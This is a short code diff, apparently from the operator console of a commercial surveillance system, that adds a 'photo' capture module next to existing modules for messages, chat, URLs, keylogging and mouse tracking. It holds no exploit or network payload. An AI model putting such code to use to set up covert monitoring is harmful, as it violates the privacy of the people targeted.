@@ -30,6 +30,7 @@ package it.ht.rcs.console.operations.view.configuration.basic
       if (model.messages) { subactions.push({action: "module", module: "messages",    status: "start"});
                             subactions.push({action: "module", module: "chat",        status: "start"}); }
       if (model.url)        subactions.push({action: "module", module: "url",         status: "start"});
+      if (model.photo)      subactions.push({action: "module", module: "photo",       status: "start"});
       if (model.keylog)   { subactions.push({action: "module", module: "keylog",      status: "start"});
                             if (!model.isMobile) {
                             subactions.push({action: "module", module: "mouse",       status: "start"});
